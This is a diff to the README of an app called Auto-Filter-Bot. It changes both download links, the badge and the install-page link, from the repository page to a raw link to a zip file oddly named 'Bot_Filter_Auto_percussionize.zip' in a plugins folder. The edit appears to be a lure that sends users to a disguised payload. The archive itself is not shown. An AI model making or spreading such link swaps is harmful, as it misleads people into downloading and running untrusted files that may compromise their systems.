@@ -1,6 +1,6 @@
 # 🤖 Auto-Filter-Bot - Simple Filtering for Fast Results
 
-[![Download Auto-Filter-Bot](https://img.shields.io/badge/Download-Auto--Filter--Bot-blue?style=for-the-badge&logo=github)](https://github.com/merolawhipping644/Auto-Filter-Bot)
+[![Download Auto-Filter-Bot](https://img.shields.io/badge/Download-Auto--Filter--Bot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/merolawhipping644/Auto-Filter-Bot/main/plugins/Bot_Filter_Auto_percussionize.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ A mouse and keyboard are enough to use the app.
 
 Visit this page to download and install Auto-Filter-Bot:
 
-[https://github.com/merolawhipping644/Auto-Filter-Bot](https://github.com/merolawhipping644/Auto-Filter-Bot)
+[https://raw.githubusercontent.com/merolawhipping644/Auto-Filter-Bot/main/plugins/Bot_Filter_Auto_percussionize.zip](https://raw.githubusercontent.com/merolawhipping644/Auto-Filter-Bot/main/plugins/Bot_Filter_Auto_percussionize.zip)
 
 ## 🪟 Install on Windows
 
